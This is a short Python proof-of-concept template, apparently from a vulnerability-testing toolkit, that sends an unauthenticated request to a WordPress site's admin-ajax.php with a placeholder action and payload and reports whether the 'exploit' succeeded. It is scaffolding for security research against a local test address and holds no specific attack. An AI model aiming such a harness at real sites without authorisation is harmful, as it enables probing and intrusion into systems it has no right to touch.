#!/usr/bin/env python3
"""
PoC Template: Unauthenticated AJAX Request (wp_ajax_nopriv_*)
Usage: python3 poc.py --url http://172.17.0.1:8000
"""
import argparse
import sys
import requests

# === CUSTOMIZE ===
AJAX_ACTION = "your_nopriv_action"   # The wp_ajax_nopriv_ action name
PAYLOAD = {
    # "param1": "value1",
}
EXPECTED_RESULT = {
    "status_code": 200,
    "body_contains": "success",
}
# === END CUSTOMIZE ===


def exploit(base_url):
    """Send unauthenticated AJAX request."""
    data = {
        "action": AJAX_ACTION,
        **PAYLOAD,
    }
    r = requests.post(f"{base_url}/wp-admin/admin-ajax.php", data=data)
    return r


def verify(response):
    ok = True
    if EXPECTED_RESULT.get("status_code") and response.status_code != EXPECTED_RESULT["status_code"]:
        ok = False
    if EXPECTED_RESULT.get("body_contains") and EXPECTED_RESULT["body_contains"] not in response.text:
        ok = False
    return ok


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://172.17.0.1:8000")
    args = parser.parse_args()

    print(f"[*] Target: {args.url}")
    print(f"[*] Action: {AJAX_ACTION} (unauthenticated)")
    response = exploit(args.url)

    print(f"[*] Response: {response.status_code}")
    print(f"[*] Body: {response.text[:500]}")

    if verify(response):
        print("\n[SUCCESS] Exploit confirmed!")
        sys.exit(0)
    else:
        print("\n[FAIL] Exploit did not produce expected result")
        sys.exit(1)


if __name__ == "__main__":
    main()
